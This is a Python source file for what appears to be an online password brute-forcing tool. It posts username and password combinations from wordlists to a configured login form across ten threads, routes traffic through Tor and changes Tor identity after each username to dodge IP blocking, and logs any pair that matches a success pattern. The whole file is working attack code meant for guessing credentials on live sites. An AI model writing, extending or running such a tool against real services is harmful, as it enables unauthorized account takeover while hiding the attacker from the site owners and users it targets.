import logging
import re
import time
from configparser import ConfigParser
from multiprocessing import Lock
from multiprocessing.pool import ThreadPool

import requests
from requests.exceptions import ConnectionError, Timeout
from alive_progress import alive_bar

from ..generator import PasswdGenerator
from ..onion import TorProxy
from .cli_parser import Args

__all__ = ["App"]


class App:
    MAX_TRIES = 3
    N_PROCESS = 10  #! DO NOT CHANGE THIS VALUE

    def __init__(self, args: Args) -> None:
        self.consecutive_fails = 0
        self.lock = Lock()
        self.logger = logging.getLogger(".".join(__name__.split(".")[1:]))
        self.cfg = ConfigParser()
        self.cfg.read(args.cfg_path)

        self.session = requests.Session()
        self.target = re.compile(self.cfg["url-endpoints"]["target"])
        self.post_url = self.cfg["url-endpoints"]["post_url"]

        self.username_field = self.cfg["html-fields"]["username_field"]
        self.password_field = self.cfg["html-fields"]["password_field"]

        self.username_path = args.usernames
        self.password_path = args.passwords
        self.it_comb = args.it_comb

    def post_search(self, username_field: str, password_field: str) -> bool:
        self.session.cookies.clear_session_cookies()
        response: requests.Response = None
        try_no = 0

        # 3 tries to connect to the target
        # connected if some response and status code is 200
        while try_no < self.MAX_TRIES and (not response or response.status_code != 200):
            try:
                response = self.session.post(
                    self.post_url,
                    data={
                        self.username_field: username_field,
                        self.password_field: password_field,
                    },
                    allow_redirects=True,
                    timeout=10,  # 10 seconds
                )
                if response and response.status_code == 200:
                    with self.lock:
                        self.consecutive_fails = 0
            except (ConnectionError, Timeout) as e:
                self.logger.debug(
                    "exception [%s] : retrying ... (%d/%d)",
                    e.__class__.__name__,
                    try_no + 1,
                    self.MAX_TRIES,
                )
                time.sleep(1)  # wait to ~avoid~ spamming
            finally:
                try_no += 1
        else:
            if not response or response.status_code != 200:
                self.logger.error(
                    "failed multiple reconnect to target [%s:%s] ❌",
                    username_field,
                    password_field,
                )
                with self.lock:
                    if self.consecutive_fails >= self.MAX_TRIES:
                        self.logger.critical(
                            "too many consecutive fails, exiting ... ❌"
                        )
                    self.consecutive_fails += 1

        if response and self.target.search(response.text):
            self.logger.info(
                "🎉 Login successful using %s:%s",
                username_field,
                password_field,
            )

    def run(self):
        user = PasswdGenerator(self.username_path, self.it_comb[0])
        passwd = PasswdGenerator(self.password_path, self.it_comb[1])

        digits = len(str(user.count))  # number of digits in user count

        self.logger.info("Starting Tor 🧄 session ...")
        with TorProxy() as tor:
            self.session.proxies = {
                "http": f"socks5h://localhost:{tor.port}",  # use Tor for HTTP connections
            }

            with alive_bar(total=user.count * passwd.count) as bar:
                with ThreadPool(self.N_PROCESS) as pool:
                    for i, u in enumerate(user()):
                        bar.title(f"on user {(i+1):0{digits}}/{user.count}")
                        for _ in pool.imap_unordered(
                            lambda p: self.post_search(u, p[:]),  # noqa
                            passwd(),  # todo: faster gen after 1st time
                        ):
                            try:
                                bar()
                            except RuntimeError:
                                # RuntimeError: dictionary changed size during iteration
                                #
                                # This is because of the `alive_bar` package
                                # which uses a dict internally to store the
                                # progress bar state.
                                #
                                # This error is raised when the progress bar
                                # is updated while the bar is being rendered.
                                #
                                # This is not a problem because the progress
                                # bar is only used to display the progress
                                # and not to store the state.
                                #
                                # So we just ignore this error.
                                pass

                        tor.identity_swap()

        self.logger.info("Done ✅")
